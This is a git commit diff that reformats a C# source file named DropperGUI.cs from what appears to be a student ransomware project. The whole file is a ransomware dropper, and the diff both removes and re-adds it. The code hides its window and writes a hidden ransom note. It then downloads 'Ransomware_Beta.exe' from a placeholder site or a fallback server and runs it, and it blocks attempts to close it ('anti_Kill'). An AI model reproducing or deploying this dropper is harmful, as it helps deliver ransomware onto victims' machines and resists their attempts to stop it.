4efe5ad09f6b2915ad28e8335a8582f36cfcd8f9
Ali Ibrahim <allosheribraheem38@gmail.com>
2021-07-30 19:31:28 +0300

    fix formating

--- Dropper/DropperGUI.cs
+++ Dropper/DropperGUI.cs
@@ -11,94 +11,108 @@ using System.Net;
 using System.Diagnostics;
 using System.IO;
 
-namespace Dropper {
-public partial class DropperGUI : Form {
-  // Data members
-  ///< summary>
-  /// Reperesents the path where the virus will be loaded into and operates.
-  ///</summary>
-  private static String pathToInfect = @"C:\Virus_Test";
-  /// <summary>
-  /// Creates a new instance of the ransomware virus dropper.
-  /// </summary>
-  public DropperGUI() {
-    InitializeComponent();
-    this.TransparencyKey = this.BackColor; // Make invisible
-  }
-  private void StartAction() {
-    this.Close();
-    /**
-     * First determine whether the virus has already infected the operating
-     * system or not This functionality will depend on how the virus announce it
-     * has already infected a certain folder This might be done by adding a new
-     * file to the "host" directory, not decided yet Create a new Folder for the
-     * ransomware
-     */
-    // Create Folder
-    Directory.CreateDirectory(pathToInfect + "\\Malware");
-    // Add the signature file if not exist
-    var directoryInfected = File.Exists(pathToInfect + "\\Malware\\README.txt");
-    if (!directoryInfected) {
-      // create the folder and the text file in the path C:\Program
-      // Filesx86\timestamp.txt P.S : make both the file and the folder hidden
-      // so that a regular user won't notice.
-      StreamWriter writer =
-          new StreamWriter(pathToInfect + @"\Malware\README.txt");
-      writer.Write("You were encrypted by Ali & Leen, good luck...^^");
-      File.SetAttributes(pathToInfect + @"\Malware\README.txt",
-                         FileAttributes.Hidden);
-    }
-    // if it already exists it means a previous version of the virus infected
-    // the OS then launch the virus by downloading it from a malicious site
-    String link = "https://www.some-site.com";
-    DownLoadFileInBackground2(link);
-    // After finishing the downloading, start the ransomware virus and terminate
-    Process.Start(pathToInfect + @"\Malware\Ransomware_Beta.exe");
-  }
-  // DownLoadFileInBackground2
-  public static void DownLoadFileInBackground2(string address) {
-    // Make protocol for donwload file from github
-    ServicePointManager.Expect100Continue = true;
-    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
-    WebClient client = new WebClient();
-    Uri uri = new Uri(address);
-    // Call DownloadFileCallback2 when the download completes.
-    client.DownloadFileCompleted +=
-        new AsyncCompletedEventHandler(DownloadFileCallback2);
-    // Specify a progress notification handler here ...
-    client.DownloadFileAsync(uri,
-                             pathToInfect + @"\Malware\Ransomware_Beta.exe");
-  }
-  private static void DownloadFileCallback2(object sender,
-                                            AsyncCompletedEventArgs e) {
-    if (e.Cancelled) {
-      Console.WriteLine("File download cancelled.");
-      DownLoadLocalFileInBackground();
-    }
+namespace Dropper
+{
+    public partial class DropperGUI : Form
+    {
+        // Data members
+        ///< summary>
+        /// Reperesents the path where the virus will be loaded into and operates.
+        ///</summary>
+        private static String pathToInfect = @"C:\Virus_Test";
+        /// <summary>
+        /// Creates a new instance of the ransomware virus dropper.
+        /// </summary>
+        public DropperGUI()
+        {
+            InitializeComponent();
+            this.TransparencyKey = this.BackColor; // Make invisible
+        }
+        private void StartAction()
+        {
+            this.Close();
+            /**
+             * First determine whether the virus has already infected the operating
+             * system or not This functionality will depend on how the virus announce it
+             * has already infected a certain folder This might be done by adding a new
+             * file to the "host" directory, not decided yet Create a new Folder for the
+             * ransomware
+             */
+            // Create Folder
+            Directory.CreateDirectory(pathToInfect + "\\Malware");
+            // Add the signature file if not exist
+            var directoryInfected = File.Exists(pathToInfect + "\\Malware\\README.txt");
+            if (!directoryInfected)
+            {
+                // create the folder and the text file in the path C:\Program
+                // Filesx86\timestamp.txt P.S : make both the file and the folder hidden
+                // so that a regular user won't notice.
+                StreamWriter writer =
+                    new StreamWriter(pathToInfect + @"\Malware\README.txt");
+                writer.Write("You were encrypted by Ali & Leen, good luck...^^");
+                File.SetAttributes(pathToInfect + @"\Malware\README.txt",
+                                   FileAttributes.Hidden);
+            }
+            // if it already exists it means a previous version of the virus infected
+            // the OS then launch the virus by downloading it from a malicious site
+            String link = "https://www.some-site.com";
+            DownLoadFileInBackground2(link);
+            // After finishing the downloading, start the ransomware virus and terminate
+            Process.Start(pathToInfect + @"\Malware\Ransomware_Beta.exe");
+        }
+        // DownLoadFileInBackground2
+        public static void DownLoadFileInBackground2(string address)
+        {
+            // Make protocol for donwload file from github
+            ServicePointManager.Expect100Continue = true;
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+            WebClient client = new WebClient();
+            Uri uri = new Uri(address);
+            // Call DownloadFileCallback2 when the download completes.
+            client.DownloadFileCompleted +=
+                new AsyncCompletedEventHandler(DownloadFileCallback2);
+            // Specify a progress notification handler here ...
+            client.DownloadFileAsync(uri,
+                                     pathToInfect + @"\Malware\Ransomware_Beta.exe");
+        }
+        private static void DownloadFileCallback2(object sender,
+                                                  AsyncCompletedEventArgs e)
+        {
+            if (e.Cancelled)
+            {
+                Console.WriteLine("File download cancelled.");
+                DownLoadLocalFileInBackground();
+            }
 
-    if (e.Error != null) {
-      Console.WriteLine(e.Error.ToString());
-    }
-  }
-  public static void DownLoadLocalFileInBackground() {
+            if (e.Error != null)
+            {
+                Console.WriteLine(e.Error.ToString());
+            }
+        }
+        public static void DownLoadLocalFileInBackground()
+        {
 
-    try {
-      WebClient webClient = new WebClient();
-      webClient.DownloadFile("URl to local server",
-                             @"C:\Program Files\System32\Ransomware_Beta.exe");
-    } catch (WebException e) {
-      LaunchLocally();
-    }
-  }
+            try
+            {
+                WebClient webClient = new WebClient();
+                webClient.DownloadFile("URl to local server",
+                                       @"C:\Program Files\System32\Ransomware_Beta.exe");
+            }
+            catch (WebException e)
+            {
+                LaunchLocally();
+            }
+        }
 
-  private static void LaunchLocally() {
-    Process.Start(pathToInfect + @"\Malware\local\Ransomware_Beta.exe");
-  }
+        private static void LaunchLocally()
+        {
+            Process.Start(pathToInfect + @"\Malware\local\Ransomware_Beta.exe");
+        }
 
         private void DropperGUI_FormClosing(object sender, FormClosingEventArgs e)
         {
             //anti_Kill
-            e.Cancel = true; 
+            e.Cancel = true;
         }
 
         private void DropperGUI_Load(object sender, EventArgs e)
